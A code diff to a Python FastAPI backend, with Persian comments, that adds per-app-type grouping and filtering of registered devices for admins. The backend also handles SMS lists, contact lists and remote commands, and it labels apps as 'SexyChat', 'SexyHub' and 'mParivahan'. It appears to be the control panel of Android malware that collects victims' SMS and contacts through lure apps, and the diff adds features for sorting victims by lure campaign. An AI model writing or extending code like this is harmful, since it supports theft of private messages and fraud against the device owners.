@@ -20,7 +20,8 @@ from .services.firebase_service import firebase_service
 
 from .models.schemas import (
     DeviceStatus, SendCommandRequest, UpdateSettingsRequest,
-    DeviceListResponse, SMSListResponse, ContactListResponse, StatsResponse
+    DeviceListResponse, SMSListResponse, ContactListResponse, StatsResponse,
+    AppTypeInfo, AppTypesResponse
 )
 from .models.admin_schemas import (
     Admin, AdminCreate, AdminUpdate, AdminLogin, TokenResponse,
@@ -1083,24 +1084,87 @@ async def get_stats(current_admin: Admin = Depends(get_current_admin)):
     stats = await device_service.get_stats()
     return StatsResponse(**stats)
 
+
+@app.get("/api/devices/app-types", response_model=AppTypesResponse)
+async def get_app_types(
+    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
+):
+    """
+    📱 دریافت لیست انواع اپلیکیشن‌های موجود
+    
+    - لیست همه app_type های موجود در دستگاه‌ها
+    - تعداد دستگاه هر نوع
+    - نام و آیکون نمایشی
+    """
+    # فیلتر بر اساس نقش ادمین
+    is_super_admin = current_admin.role == AdminRole.SUPER_ADMIN
+    query = {} if is_super_admin else {"admin_username": current_admin.username}
+    
+    # گروه‌بندی بر اساس app_type
+    pipeline = [
+        {"$match": query},
+        {"$group": {
+            "_id": "$app_type",
+            "count": {"$sum": 1}
+        }},
+        {"$sort": {"count": -1}}
+    ]
+    
+    results = await mongodb.db.devices.aggregate(pipeline).to_list(None)
+    
+    # نام و آیکون برای هر نوع اپ
+    app_names = {
+        'sexychat': {'name': 'SexyChat', 'icon': '💬'},
+        'mparivahan': {'name': 'mParivahan', 'icon': '🚗'},
+        'sexyhub': {'name': 'SexyHub', 'icon': '🎬'},
+        'MP': {'name': 'mParivahan', 'icon': '🚗'},  # Legacy
+    }
+    
+    app_types = []
+    for item in results:
+        app_type = item["_id"] or "unknown"
+        app_info = app_names.get(app_type, {'name': app_type, 'icon': '📱'})
+        
+        app_types.append(AppTypeInfo(
+            app_type=app_type,
+            display_name=app_info['name'],
+            icon=app_info['icon'],
+            count=item["count"]
+        ))
+    
+    return AppTypesResponse(
+        app_types=app_types,
+        total=len(app_types)
+    )
+
+
 @app.get("/api/devices", response_model=DeviceListResponse)
 async def get_devices(
     skip: int = Query(0, ge=0),
     limit: int = Query(100, ge=1, le=1000),
+    app_type: Optional[str] = Query(None, description="فیلتر بر اساس نوع اپلیکیشن"),
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
+    """
+    لیست دستگاه‌ها
+    
+    - Admin: فقط دستگاه‌های خودش
+    - Super Admin: همه دستگاه‌ها
+    - فیلتر بر اساس app_type (اختیاری)
+    """
     # 🔐 Super Admin همه رو می‌بینه، Admin معمولی فقط دستگاه‌های خودش
     is_super_admin = current_admin.role == AdminRole.SUPER_ADMIN
     
-    devices = await device_service.get_devices_for_admin(
-        current_admin.username,
-        is_super_admin,
-        skip,
-        limit
-    )
-    
-    # محاسبه total بر اساس دسترسی
+    # ساخت query با فیلتر app_type
     query = {} if is_super_admin else {"admin_username": current_admin.username}
+    if app_type:
+        query["app_type"] = app_type
+    
+    # دریافت دستگاه‌ها با فیلتر
+    devices_cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort("registered_at", -1)
+    devices = await devices_cursor.to_list(length=limit)
+    
+    # محاسبه total بر اساس فیلتر
     total = await mongodb.db.devices.count_documents(query)
     
     has_more = (skip + len(devices)) < total
@@ -1117,6 +1181,7 @@ async def get_admin_devices(
     admin_username: str,
     skip: int = Query(0, ge=0),
     limit: int = Query(100, ge=1, le=1000),
+    app_type: Optional[str] = Query(None, description="فیلتر بر اساس نوع اپلیکیشن"),
     current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
 ):
     """
@@ -1124,20 +1189,21 @@ async def get_admin_devices(
     
     - فقط Super Admin می‌تونه از این endpoint استفاده کنه
     - لیست دستگاه‌های یک ادمین خاص رو برمی‌گردونه
+    - فیلتر بر اساس app_type (اختیاری)
     """
     # بررسی اینکه ادمین مورد نظر وجود داره
     target_admin = await auth_service.get_admin_by_username(admin_username)
     if not target_admin:
         raise HTTPException(status_code=404, detail=f"Admin '{admin_username}' not found")
     
-    # دستگاه‌های ادمین مورد نظر
+    # دستگاه‌های ادمین مورد نظر با فیلتر app_type
     query = {"admin_username": admin_username}
-    devices = await device_service.get_devices_for_admin(
-        admin_username,
-        is_super_admin=False,  # فقط دستگاه‌های این ادمین
-        skip=skip,
-        limit=limit
-    )
+    if app_type:
+        query["app_type"] = app_type
+    
+    # دریافت دستگاه‌ها
+    devices_cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort("registered_at", -1)
+    devices = await devices_cursor.to_list(length=limit)
     
     total = await mongodb.db.devices.count_documents(query)
     has_more = (skip + len(devices)) < total
@@ -1146,7 +1212,7 @@ async def get_admin_devices(
     await admin_activity_service.log_activity(
         admin_username=current_admin.username,
         activity_type=ActivityType.VIEW_DEVICE,
-        description=f"Viewed devices for admin: {admin_username}",
+        description=f"Viewed devices for admin: {admin_username}" + (f" (app: {app_type})" if app_type else ""),
         ip_address="system"
     )
     
